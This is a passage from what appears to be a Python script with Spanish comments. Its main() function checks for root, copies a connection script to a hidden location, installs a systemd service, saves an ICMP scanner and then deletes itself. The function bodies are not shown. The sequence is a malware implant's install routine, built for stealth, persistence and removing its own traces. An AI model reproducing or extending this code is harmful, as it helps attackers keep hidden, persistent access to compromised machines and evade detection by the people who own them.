...
def main():
    check_root()  # Verificar si se está ejecutando como root
    copy_to_hidden_location()  # Copiar el script de conexión
    create_systemd_service()  # Crear el servicio de systemd
    save_icmp_scanner()  # Ejecutar el escáner ICMP

    self_destruct()  # Autodestruir el script original
